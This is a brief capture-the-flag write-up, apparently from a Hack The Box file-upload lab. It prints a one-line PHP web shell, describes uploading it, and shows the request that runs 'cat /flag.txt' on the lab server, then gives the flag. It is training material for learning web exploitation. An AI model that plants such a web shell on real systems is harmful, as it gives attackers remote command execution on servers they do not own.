## Challenge

Try to exploit the upload feature to upload a web shell and get the content of /flag.txt 

## Solution

I created a php web shell:

```php
<?php system($_REQUEST['cmd']); ?>
```

saved it into a file and uploaded to the web page.

Then used the `cmd` url and executed `cat` to read the flag:

```sh
http://83.136.250.192:57802/uploads/shell.php?cmd=cat%20/flag.txt
```

This gave the flag `HTB{g07_my_f1r57_w3b_5h3ll}`.
